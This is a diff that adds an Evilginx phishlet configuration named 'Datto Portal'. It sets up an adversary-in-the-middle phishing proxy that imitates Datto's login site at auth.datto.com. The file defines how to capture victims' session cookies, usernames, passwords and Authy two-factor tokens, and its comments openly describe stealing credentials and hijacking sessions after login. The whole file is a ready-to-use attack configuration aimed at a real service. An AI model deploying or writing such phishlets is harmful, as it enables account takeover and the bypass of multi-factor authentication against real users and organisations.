@@ -1,0 +1,50 @@
+# Created:  27/05/25
+# Modified: 28/05/25
+
+name: 'Datto Portal'
+author: 'Rhys McClew'
+min_ver: '3.2.0'
+
+# Indicates the domain and subdomains to proxy.
+# The phish_sub is the subdomain that the phishing page will imitate.
+proxy_hosts:
+  - { phish_sub: 'auth', orig_sub: 'auth', domain: 'datto.com', session: true, is_landing: true }
+
+# Allows the phishlet to replace instances of the actual domain name with the phishing domain, which is critical for the phishing page to function correctly.
+sub_filters: []
+
+# Identifies the cookies that should be captured from the victim's browser to gain access to the victim's session.
+auth_tokens:
+  - domain: 'auth.datto.com'
+    keys: ['PHPSESSID']
+    type: 'cookie'
+  - domain: '.auth.datto.com'
+    keys: ['PHPSESSID']
+    type: 'cookie'
+
+# This field determines the credentials that the phishlet is engineered to steal.
+# The key is the name of the credential and search is a regex that the program will use to identify and extract these details from the user's input.
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'authy_token'
+    search: '(.*)'
+    type: 'post'
+
+# Defines the URLs that Evilginx will treat as the authenticated URLs.
+# After the victim logs in, Evilginx will look out for a redirect to one of these URLs, at which point it will steal the listed auth_tokens.
+auth_urls:
+  - '/account-selection'
+
+# Here you specify the identifiers of the username and password fields in the login form on the original webpage.
+# The url is the link of the page where the victim enters their credentials.
+login:
+  domain: 'auth.datto.com'
+  path: '/login'
